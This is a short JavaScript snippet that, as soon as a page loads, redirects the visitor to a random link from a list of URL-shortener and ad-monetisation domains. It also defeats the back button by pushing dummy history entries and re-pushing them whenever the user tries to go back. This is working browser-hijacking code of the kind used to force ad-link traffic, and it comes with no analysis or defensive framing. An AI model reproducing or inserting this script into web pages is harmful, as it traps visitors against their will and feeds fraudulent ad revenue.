var urls = ["https://besargaji.com/uteCJm",
            "https://link.bicolink.net/rgFb3TUM",
            "https://arahlink.id/ljPG",
            "https://ouo.io/N0KJlO",
            "https://adbull.me/MkNbawjS",
            "https://to.aoutoqw.xyz/46nWf",
            "https://go.aoutoqw.xyz/FuazTfv"];

function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

